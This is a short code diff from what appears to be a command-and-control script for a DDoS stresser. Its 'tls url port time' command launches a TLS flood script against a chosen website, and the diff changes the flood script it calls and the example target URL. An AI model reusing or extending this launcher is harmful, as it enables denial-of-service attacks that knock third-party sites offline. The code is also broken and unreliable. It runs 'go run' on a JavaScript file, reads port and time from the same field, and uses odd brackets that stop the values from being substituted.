@@ -409,10 +409,10 @@ def main():
                 url = cnc.split()[1]
                 port = cnc.split()[2]
                 time = cnc.split()[2]
-                os.system(f'go run TLS.go 〔url〕 〔port〕 〔time〕')
+                os.system(f'go run tls.js 〔url〕 〔port〕 〔time〕')
             except IndexError:
                 print('Usage: tls url port time')
-                print('Example: tls https://panelgemleng.pannelmurah.xyz/ 443 60')
+                print('Example: tls https://target.com/ 443 60')
                         
                               
                         
